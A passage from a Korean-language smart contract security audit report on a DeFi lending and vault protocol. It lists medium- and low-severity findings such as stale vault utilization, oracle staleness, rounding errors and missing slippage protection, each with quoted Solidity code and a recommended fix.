
## 심각도

**영향:** 낮음

**가능성:** 높음

## 설명

`assetsUtilized`는 다음 계산으로 얻습니다.

```solidity
    uint256 _assetsUtilized = externalAssetVault.vaultUtilization(address(this));
```

그러나 저장된 활용률 값을 업데이트하기 위해 금고에서 `whitelistUpdate()`를 호출하지 않으므로 `_assetsUtilized`가 오래된 것입니다.

## 권장 사항

최신 상태인지 확인하기 위해 `_assetsUtilized`를 얻기 전에 `externalAssetVault.whitelistUpdate(true)`를 호출하십시오.

# [M-11] 새로 생성된 풀에 대해 Observe가 실패할 수 있음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명

견적 토큰의 가격은 UniswapV3SinglePriceOracle.sol에서 다음과 같이 가져옵니다 ->

```solidity
function _getSqrtPriceX96FromPool(IUniswapV3Pool _pool, uint32 _interval)
       public
       view
       returns (uint160 _sqrtPriceX96)
   {
       if (_interval == 0) {
           (_sqrtPriceX96,,,,,,) = _pool.slot0();
       } else {
           uint32[] memory secondsAgo = new uint32[](2);
           secondsAgo[0] = _interval;
           secondsAgo[1] = 0; // to (now)
           (int56[] memory tickCumulatives,) = _pool.observe(secondsAgo);
           int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
           int24 arithmeticMeanTick = int24(tickCumulativesDelta / int32(_interval));
           // Always round to negative infinity
           if (tickCumulativesDelta < 0 && (tickCumulativesDelta % int32(_interval) != 0)) arithmeticMeanTick--;
           _sqrtPriceX96 = TickMath.getSqrtRatioAtTick(arithmeticMeanTick);
       }
   }
```

... 여기서 풀은 SP_TKN을 통해 표시되는 포드의 기본 TKN 가격을 책정하기 위해 TWAP를 얻는 v3 풀이고 spTKN 가격으로 변환하며, 틱 누적을 얻기 위해 풀에서 `observe` 함수를 호출합니다. 그러나 v3 풀이 아직 관측치가 충분하지 않을 가능성이 있으며 이 경우 관측 호출이 실패합니다. 이를 처리하는 적절한 접근 방식은 [여기](https://github.com/NFTX-project/nftx-protocol-v3/blob/master/src/NFTXVaultFactoryUpgradeableV3.sol#L454)에서 구현된 것을 볼 수 있습니다.

## 권장 사항

관측치가 부족한 풀은 위에서 설명한 대로 처리해야 합니다.

# [M-12] 여러 작업에서 `whitelistUpdate()`가 호출되지 않음

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

`FraxlendPairCore`의 여러 작업은 `externalAssetVault` / `LendingAssetVault`의 자산을 포함하여 쌍에서 사용할 수 있는 총 자산을 반환하는 `_totalAssetAvailable`에 액세스합니다(구성된 경우).

```solidity
    function _totalAssetAvailable(VaultAccount memory _totalAsset, VaultAccount memory _totalBorrow, bool _includeVault)
        internal
        view
        returns (uint256)
    {
        if (_includeVault) {
            return _totalAsset.totalAmount(address(externalAssetVault)) - _totalBorrow.amount;
        }
        return _totalAsset.amount - _totalBorrow.amount;
    }
```

```solidity
    function totalAvailableAssetsForVault(address _vault) public view override returns (uint256 _totalVaultAvailable) {
        uint256 _overallAvailable = totalAvailableAssets();

        _totalVaultAvailable = vaultMaxAllocation[_vault] > vaultUtilization[_vault]
            ? vaultMaxAllocation[_vault] - vaultUtilization[_vault]
            : 0;

        _totalVaultAvailable = _overallAvailable < _totalVaultAvailable ? _overallAvailable : _totalVaultAvailable;
    }
```

`totalAvailableAssetsForVault`는 금고의 `vaultUtilization` 값에 따라 달라지며, 이는 `FraxlendPairCore`의 이자가 업데이트된 후 업데이트되어야 합니다. 그러나 최신 상태(가장 최근 이자 업데이트 후)에 의존하는 여러 함수는 `whitelistUpdate`를 호출하지 않고 `externalAssetVault.totalAvailableAssetsForVault`에 액세스합니다. 결과적으로 이러한 작업은 유효한 최신 총 가용 자산을 사용하지 않습니다.

```solidity
    function _redeem(
        VaultAccount memory _totalAsset,
        uint128 _amountToReturn,
        uint128 _shares,
        address _receiver,
        address _owner,
        bool _skipAllowanceCheck
    ) internal {
        // Check for sufficient allowance/approval if necessary
        if (msg.sender != _owner && !_skipAllowanceCheck) {
            uint256 allowed = allowance(_owner, msg.sender);
            // NOTE: This will revert on underflow ensuring that allowance > shares
            if (allowed != type(uint256).max) _approve(_owner, msg.sender, allowed - _shares);
        }

        // Check for sufficient withdraw liquidity (not strictly necessary because balance will underflow)
>>>     uint256 _totAssetsAvailable = _totalAssetAvailable(_totalAsset, totalBorrow, true);
        if (_totAssetsAvailable < _amountToReturn) {
            revert InsufficientAssetsInContract(_totAssetsAvailable, _amountToReturn);
        }

        // If we're redeeming back to the vault, don't deposit from the vault
        if (_owner != address(externalAssetVault)) {
>>>         uint256 _localAssetsAvailable = _totalAssetAvailable(_totalAsset, totalBorrow, false);
            if (_localAssetsAvailable < _amountToReturn) {
                uint256 _vaultAmt = _amountToReturn - _localAssetsAvailable;
                _depositFromVault(_vaultAmt);

                // Rewrite to memory, now it's the latest value!
                _totalAsset = totalAsset;
            }
        }

        // ...
    }
```

```solidity
    function _borrowAsset(uint128 _borrowAmount, address _receiver) internal returns (uint256 _sharesAdded) {
        // Get borrow accounting from storage to save gas
        VaultAccount memory _totalBorrow = totalBorrow;

        // Check available capital (not strictly necessary because balance will underflow, but better revert message)
>>>     uint256 _totalAssetsAvailable = _totalAssetAvailable(totalAsset, _totalBorrow, true);
        if (_totalAssetsAvailable < _borrowAmount) {
            revert InsufficientAssetsInContract(_totalAssetsAvailable, _borrowAmount);
        }
>>>     uint256 _localAssetsAvailable = _totalAssetAvailable(totalAsset, _totalBorrow, false);
        if (_localAssetsAvailable < _borrowAmount) {
            uint256 _externalAmt = _borrowAmount - _localAssetsAvailable;
            _depositFromVault(_externalAmt);
        }

        // Calculate the number of shares to add based on the amount to borrow
        _sharesAdded = _totalBorrow.toShares(_borrowAmount, true);

       // ...
    }
```

## 권장 사항

`externalAssetVault` / `LendingAssetVault`가 구성된 경우 `_totalAssetAvailable`에 액세스하기 전에 이러한 함수에서 `whitelistUpdate`를 트리거하십시오.

# [M-13] `vaultUtilization`이 잘못 업데이트됨

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명:

LendingAssetVault.sol 내부에서 금고의 활용률은 마지막 업데이트 이후 CBR이 얼마나 변경되었는지에 따라 `_updateAssetMetadataFromVault` 내부에서 업데이트됩니다. 간단히 말해서 cbr이 감소하면 금고 활용률이 감소하고 그렇지 않으면 증가합니다. 이를 처리하는 로직은 다음과 같습니다(`_updateAssetMetadataFromVault`의 스니펫) -->

```solidity
        uint256 _vaultAssetRatioChange = _prevVaultCbr > _vaultWhitelistCbr[_vault]
            ? ((PRECISION * _prevVaultCbr) / _vaultWhitelistCbr[_vault]) - PRECISION
            : ((PRECISION * _vaultWhitelistCbr[_vault]) / _prevVaultCbr) - PRECISION;

        uint256 _currentAssetsUtilized = vaultUtilization[_vault];
        uint256 _changeUtilizedState = (_currentAssetsUtilized * _vaultAssetRatioChange) / PRECISION;
        vaultUtilization[_vault] = _prevVaultCbr > _vaultWhitelistCbr[_vault]
            ? _currentAssetsUtilized < _changeUtilizedState
                ? _currentAssetsUtilized
```

cbr이 감소하고 그 감소폭이 현재 활용률보다 크면 활용률이 동일하게 유지되는 것을 볼 수 있습니다. 반면 이 경우 활용률은 0이어야 합니다. cbr이 급격히 감소하는 시나리오에서 동일하게 유지하면 금고 입금/출금에 대한 회계가 부정확해지므로 잘못된 것입니다.

## 권장 사항

cbr이 금고의 현재 활용률보다 많이 감소한 경우 금고 활용률을 0으로 재설정하십시오.

# [L-01] `IndexManager.setAuthorized`의 부적절한 접근 제어

`setAuthorized`는 `authorized` 목록에 주소를 추가하거나 제거하는 데 사용할 수 있는 함수입니다. 그러나 `onlyAuthorized` 수정자가 있어 제거될 주소가 `authorized` 목록에 다른 주소를 추가하여 제거를 방지할 수 있습니다. 소유자만 호출할 수 있도록 이 함수를 제한하는 것을 고려하십시오.

# [L-02] 자체 대출 쌍의 부실 부채로 인해 더 많은 포지션이 즉시 청산 가능해짐

부실 부채 청산이 발생하면 대출 쌍의 증서(fTokens) 가치가 급격히 떨어집니다.

이는 쌍 LP 토큰이 fToken이므로 담보 가치를 낮춥니다(따라서 fToken은 담보 aspTkn의 절반을 구성함). 담보 가치가 떨어졌으므로 이는 더 많은 청산 가능한 포지션으로 이어집니다.

즉, 더러운/부실 부채 청산을 수행하는 계정은 부실 부채 청산 전에는 청산할 수 없었던 더 많은 포지션을 원자적으로 청산할 수 있습니다.

이러한 풀에 대해 보수적인 최대 LTV를 설정하여 완화할 수 있으므로 낮음으로 표시합니다.

# [L-03] DIA 오라클을 통한 Chainlink 가격이 오래되었을 수 있음

DIA 오라클을 통해 견적 토큰의 가격을 가져올 때 먼저 오라클에서 견적 토큰의 값을 가져온 다음 기본 변환 기본 풀 가격을 `_getChainlinkPriceFeedPrice18`을 통해 chainlink 오라클에서 가져옵니다 -->

```solidity
uint256 _basePrice18 = 10 ** 18;
        uint256 _updatedAt = block.timestamp;
        if (_clBaseConversionPoolPriceFeed != address(0)) {
            (_basePrice18, _updatedAt, _isBadData) = _getChainlinkPriceFeedPrice18(_clBaseConversionPoolPriceFeed);
        }
        _price18 = (_quotePrice8 * _basePrice18) / 10 ** 8;
    }
```

그러나 반환된 `_updatedAt` 타임스탬프가 여기에서(또는 chainlink 오라클 계약에서도) 확인되지 않으므로 기본 가격이 과거의 오래된 가격일 수 있으며 결과적으로 견적 가격이 부정확하게 계산될 수 있습니다.

`_updatedAt`이 과거와 너무 멀지 않고 허용된 범위 내에 있는지 확인하십시오.

# [L-04] 토큰이 18 소수점이 아닌 경우 잘못된 증서

1.) LendingAssetVault.sol의 총 공급량이 0일 때 입금 흐름 중에 다음을 따릅니다 -->

```solidity
function deposit(uint256 _assets, address _receiver) external override returns (uint256 _shares) {
        _updateInterestAndMdInAllVaults(address(0));
        _shares = convertToShares(_assets);
        _deposit(_assets, _shares, _receiver);
    }
```

그리고 convertToShares -->

```solidity
function convertToShares(uint256 _assets) public view override returns (uint256 _shares) {
        _shares = (_assets * PRECISION) / _cbr();
    }
```

그리고 `_cbr`은 -->

```solidity
function _cbr() internal view returns (uint256) {
        uint256 _supply = totalSupply();
        return _supply == 0 ? PRECISION : (PRECISION * _totalAssets) / _supply;
    }
```

2.) 볼 수 있듯이 총 공급량이 0이면 cbr = PRECISION이며 이는 1e27입니다. 따라서 `convertToShares` 내부에서 자산이 예를 들어 6 소수점 토큰인 경우 공식의 정밀도는 다음과 같습니다 -->

1e6 * 1e27 / 1e27 = 1e6

따라서 증서는 원래 있어야 할 것(증서 토큰은 18 소수점)보다 1e12배 적게 주조됩니다.

이는 첫 번째 예금에만 제한되고 첫 번째 예금은 공장 소유자가 수행하므로 여기서는 영향이 제한적입니다.

18 소수점이 아닌 토큰의 첫 번째 예금에 대한 정밀도를 적절하게 처리하십시오.

# [L-05] `AutoCompoundingPodLp` 작업이 샌드위치 공격에 취약함

`deposit`, `mint`, `withdraw` 및 `redeem`을 포함한 `AutoCompoundingPodLp` 내의 주요 함수는 작업 중에 `_processRewardsToPodLp`를 트리거하여 슬리피지 보호를 제공하지 않습니다. `_processRewardsToPodLp` 내에서 여러 스왑 작업이 수행되며 적절한 슬리피지 보호가 없으면 이러한 작업은 샌드위치 공격에 취약합니다.

```solidity
    function deposit(uint256 _assets, address _receiver) external override returns (uint256 _shares) {
>>>     _processRewardsToPodLp(0, block.timestamp);
        _shares = convertToShares(_assets);
        _deposit(_assets, _shares, _receiver);
    }
```

```solidity
    function mint(uint256 _shares, address _receiver) external override returns (uint256 _assets) {
>>>     _processRewardsToPodLp(0, block.timestamp);
        _assets = convertToAssets(_shares);
        _deposit(_assets, _shares, _receiver);
    }
```

```solidity
    function _withdraw(uint256 _assets, uint256 _shares, address _caller, address _owner, address _receiver) internal {
        require(_shares != 0, "B");

        if (_caller != _owner) {
            _spendAllowance(_owner, _caller, _shares);
        }

>>>     _processRewardsToPodLp(0, block.timestamp);

        _totalAssets -= _assets;
        _burn(_owner, _shares);
        IERC20(_asset()).safeTransfer(_receiver, _assets);
        emit Withdraw(_owner, _receiver, _receiver, _assets, _shares);
    }
```

이러한 함수 내에 슬리피지 보호를 구현하는 것을 고려하십시오. 오라클을 사용하여 가격과 예상 최소 출력을 계산한 다음 `_processRewardsToPodLp`에 제공할 수 있습니다.

# [L-06] 오래된 `SafeERC20` 라이브러리 사용

이 프로젝트는 현재 OpenZeppelin의 `SafeERC20` 라이브러리의 구버전을 사용하고 있으며, 이는 USDT와 같은 특정 토큰과 상호 작용할 때 알려진 문제가 있습니다. 구체적으로 토큰에 0이 아닌 허용량이 있고 `approve(amount)` 함수가 호출되면 허용량을 성공적으로 업데이트하는 대신 되돌려질 수 있습니다. 이 동작은 예상치 못한 결과를 초래하고 계약이 필요한 토큰 전송을 승인할 수 없으므로 잠재적인 서비스 거부(DoS) 공격으로 이어질 수 있습니다.

OpenZeppelin의 최신 버전에서는 이 문제가 해결되었습니다. 업데이트된 safeIncreaseAllowance() 함수는 새로운 양수 값을 할당하기 전에 먼저 허용량을 0으로 설정하여 되돌리기 문제를 방지하고 더 원활한 토큰 상호 작용을 보장합니다.

OpenZeppelin 종속성을 최신 버전으로 업데이트하는 것을 고려하십시오.

# [L-07] VotingPool에 대리 업데이트 기능 부족

VotingPool.sol 계약에서 업데이트 함수는 현재 호출자가 자신의 투표권만 업데이트할 수 있도록 허용하여 투표 시스템의 예상치 못한 동작을 초래할 수 있습니다. 사용자는 변환 계수 업데이트 후 잔액 업데이트를 피하거나 이점을 얻기 위해 `addOrUpdateAsset` 호출을 프런트러닝할 수 있습니다.

```solidity
    function update(address _asset) external returns (uint256 _convFctr, uint256 _convDenom) {
>>      return _update(_msgSender(), _asset, 0);
    }

    function _update(address _user, address _asset, uint256 _addAmt)
        internal
        returns (uint256 _convFctr, uint256 _convDenom)
    {
        require(assets[_asset].enabled, "E");
        (_convFctr, _convDenom) = _getConversionFactorAndDenom(_asset);
        Stake storage _stake = stakes[_user][_asset];
        uint256 _den = _stake.stakedToOutputDenomenator > 0 ? _stake.stakedToOutputDenomenator : PRECISION;
        uint256 _mintedAmtBefore = (_stake.amtStaked * _stake.stakedToOutputFactor) / _den;
        _stake.amtStaked += _addAmt;
        _stake.stakedToOutputFactor = _convFctr;
        _stake.stakedToOutputDenomenator = _convDenom;
        uint256 _finalNewMintAmt = (_stake.amtStaked * _convFctr) / _convDenom;
        if (_finalNewMintAmt > _mintedAmtBefore) {
            _mint(_user, _finalNewMintAmt - _mintedAmtBefore);
>>      } else if (_mintedAmtBefore > _finalNewMintAmt) {
            if (_mintedAmtBefore - _finalNewMintAmt > balanceOf(_user)) {
                _burn(_user, balanceOf(_user));
            } else {
                _burn(_user, _mintedAmtBefore - _finalNewMintAmt);
            }
        }
        emit Update(_user, _asset, _convFctr, _convDenom);
    }
```

`_mintedAmtBefore` 값이 현재 `_convFctr` 및 `_convDenom` 값에 대해 계산된 주조 금액을 초과할 때 무허가 사용자 잔액 업데이트 기능을 구현하는 것을 고려하십시오.

# [L-08] UniswapV3 풀이 1% 수수료 등급을 반드시 지원하지는 않을 수 있음

AutoCompoundingPodLp.sol에서 보상 토큰을 pairedLpToken으로 교환하는 동안 `_tokenToPairedLpToken`이 호출되고 교환을 위해 다음을 수행합니다 ->

```solidity

try DEX_ADAPTER.swapV3Single(
            _rewardsToken,
            _swapOutputTkn,
            REWARDS_POOL_FEE,
            _amountIn,
            0, // _amountOutMin can be 0 because this is nested inside of function with LP slippage provided
            address(this)
        )
```

그러나 하드코딩된 1%인 REWARDS_POOL_FEE를 지원하는 rewardToken/pairedLptoken의 uniV3 풀이 존재하는 것은 필수가 아니며, 이 경우 해당 보상 토큰에 대한 스왑은 항상 실패하고 pairedLpToken으로 교환되지 않습니다.

다음 구성을 가진 풀이 존재하는지 확인하고 이상적으로는 풀의 수수료 등급을 하드코딩하지 마십시오.

# [L-09] `previewMint()` 반올림 방향이 올바르지 않음

`FraxlendPairCore.previewMint`는 제공된 `_shares`를 주조하는 데 필요한 증서 양을 계산하는 데 사용되는 함수입니다.

```solidity
    function previewMint(uint256 _shares) external view returns (uint256 _amount) {
        (,,,, VaultAccount memory _totalAsset,) = previewAddInterest();
        // @audit - should be true (roundup)
        _amount = _totalAsset.toAmount(_shares, false);
    }
```

그러나 계산된 `_amount`는 올림 대신 내림되어 반환된 금액이 부정확해지고 잠재적으로 통합 문제로 이어질 수 있습니다.

`FraxlendPairCore.previewMint`를 다음과 같이 업데이트하십시오.

```diff
    function previewMint(uint256 _shares) external view returns (uint256 _amount) {
        (,,,, VaultAccount memory _totalAsset,) = previewAddInterest();
-        _amount = _totalAsset.toAmount(_shares, false);
+        _amount = _totalAsset.toAmount(_shares, true);
    }
```

# [L-10] 일부 뷰 함수가 누적 이자를 고려하지 않음

`LendingAssetVault`의 `previewWithdraw`, `previewRedeem`, `maxWithdraw`, `maxRedeem`, `previewDeposit` 및 `previewMint`는 인출/상환 또는 주조/입금 작업에 필요한 자산 또는 증서를 계산하는 데 사용됩니다. 그러나 이러한 함수는 현재 금고의 누적 이자를 고려하지 않으므로 이러한 함수에 의존하여 `LendingAssetVault`와 상호 작용하는 통합자가 잠재적으로 잘못된 금액을 사용할 수 있습니다.

언급된 함수에서 누적 이자를 고려하십시오.

# [L-11] `AutoCompoundingPodLp` 금고가 EIP4626을 따르지 않음

'보안 고려 사항' 헤더 아래에는 사용자에게 제공되는 증서/자산은 내림해야 하지만 사용자로부터 가져올 때는 올림해야 한다고 명시되어 있습니다.

`withdraw()` 함수에서 `_shares`(`convertToShares()` 내)를 얻기 위한 계산은 사양의 권장 사항과 반대되는 내림을 수행합니다. 마찬가지로 `mint()` 함수는 사용자가 일정 수의 증서를 주조하는 데 필요한 자산을 내림합니다.

`rounding` 매개변수를 적절하게 설정하여 [OpenZeppelin 수학 라이브러리](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/69c8def5f222ff96f2b5beff05dfba996368aa79/contracts/utils/math/Math.sol#L228-L230)의 mulDiv()를 사용하는 것이 좋습니다.

# [L-12] `BASE_CONVERSION_DIA_FEED` 값 확인 누락

`spTKNMinimalOracle.constructor`는 `기본 변환 구성 중 하나만(또는 둘 다 아님) 채워야 함`을 확인합니다. 동시에 `BASE_CONVERSION_DIA_FEED` 변수에 대한 확인이 누락되었습니다. 이로 인해 계약이 잘못 구성될 수 있습니다. 해당 확인을 추가하는 것을 고려하십시오.

```solidity
    constructor(bytes memory _requiredImmutables, bytes memory _optionalImmutables) {
<...>
        (
            BASE_CONVERSION_CHAINLINK_FEED,
            BASE_CONVERSION_CL_POOL,
>>          BASE_CONVERSION_DIA_FEED,
            CHAINLINK_BASE_PRICE_FEED,
            CHAINLINK_QUOTE_PRICE_FEED,
            _v2Reserves
        ) = abi.decode(_optionalImmutables, (address, address, address, address, address, address));
        V2_RESERVES = IV2Reserves(_v2Reserves);

        // only one (or neither) of the base conversion config should be populated
>>      require(BASE_CONVERSION_CHAINLINK_FEED == address(0) || BASE_CONVERSION_CL_POOL == address(0), "CONV");
<...>
    function _getDefaultPrice18() internal view returns (bool _isBadData, uint256 _price18) {
        (_isBadData, _price18) = IMinimalSinglePriceOracle(UNISWAP_V3_SINGLE_PRICE_ORACLE).getPriceUSD18(
            BASE_CONVERSION_CHAINLINK_FEED, UNDERLYING_TKN, UNDERLYING_TKN_CL_POOL, twapInterval
        );
        if (_isBadData) {
            return (true, 0);
        }

>>      if (BASE_CONVERSION_DIA_FEED != address(0)) {
            (bool _subBadData, uint256 _baseConvPrice18) = IMinimalSinglePriceOracle(DIA_SINGLE_PRICE_ORACLE)
                .getPriceUSD18(address(0), BASE_IN_CL, BASE_CONVERSION_DIA_FEED, 0);
            if (_subBadData) {
                return (true, 0);
            }
            _price18 = (10 ** 18 * _price18) / _baseConvPrice18;
>>      } else if (BASE_CONVERSION_CL_POOL != address(0)) {
            (bool _subBadData, uint256 _baseConvPrice18) = IMinimalSinglePriceOracle(UNISWAP_V3_SINGLE_PRICE_ORACLE)
                .getPriceUSD18(address(0), BASE_IN_CL, BASE_CONVERSION_CL_POOL, twapInterval);
            if (_subBadData) {
                return (true, 0);
            }
            _price18 = (10 ** 18 * _price18) / _baseConvPrice18;
        }
    }
```

# [L-13] `convertToAssets` 및 `convertToShares`가 본드 및 디본드 수수료를 고려하지 않음

`convertToAssets` 및 `convertToShares`는 본딩/디본딩에 필요한 증서/자산을 계산하는 데 사용됩니다. 그러나 본드 및 디본드 수수료를 고려하지 않으므로 이러한 함수에 의존하는 통합자가 잘못된 금액 처리로 인해 되돌려질 수 있습니다.

# [L-14] `setYieldConvEnabled()` 호출에서 `_processRewardsToPodLp` 호출

AutoCompoundingPodLp.sol에서 소유자는 yieldConvEnabled를 끌 수 있으며 이 경우 증서에 보상이 발생하지 않습니다. 관리자가 yieldConv를 끄는 경우 이전에 생성되었을 수익을 계산해야 하므로 함수는 다음과 같이 먼저 `_processRewardsToPodLp`를 호출해야 합니다 -->

```solidity
function setYieldConvEnabled(bool _enabled) external onlyOwner {
        require(yieldConvEnabled != _enabled, "T");
        _processRewardsToPodLp();
        yieldConvEnabled = _enabled;
    }
```

# [L-15] 모든 풀에 고정된 `slippage` 변수 사용

풀마다 유동성 깊이가 다르기 때문에 스왑을 수행할 때 동일한 `slippage` 매개변수를 사용하는 것은 최적이 아닙니다. 예를 들어 유동성이 더 깊은 풀은 가격 영향이 적지만 차익 거래자는 최대 슬리피지까지 훔치기 위해 샌드위치 공격을 할 수 있습니다. 유동성이 적은 풀의 경우 이를 수용하기 위해 `slippage` 매개변수를 높여야 할 수 있습니다.

고정 변수를 폴백으로 사용하여 각 토큰 쌍에 대한 슬리피지 허용 오차를 저장하는 매핑을 갖는 것이 좋습니다.

# [L-16] `selfLendingPod`는 임의의 계약일 수 있음

레버리지 포지션 생성자는 실제로 포드가 아닌 `_selfLendingPairPod`를 전달할 수 있습니다. 이것이 즉시 악용될 수는 없지만 `LeverageManager`가 [여기](https://github.com/peapodsfinance/contracts/blob/dccf7ce1df4cff8c3800ffb284afe644813e128f/contracts/lvf/LeverageManager.sol#L474)에서 이 임의의 주소에 토큰을 승인하기 때문에 위험합니다.

# [L-17] `claimReward()`가 수수료 처리를 트리거하지 않음

`claimReward`가 호출되면 `_processFeesIfApplicable`을 트리거하지 않으므로 청구된 수수료에 `_wallet`이 수집할 수 있는 최신 보상 금액이 포함되지 않을 수 있습니다. `TokenRewards.claimReward`가 호출될 때 `_processFeesIfApplicable`을 트리거하는 것을 고려하십시오.
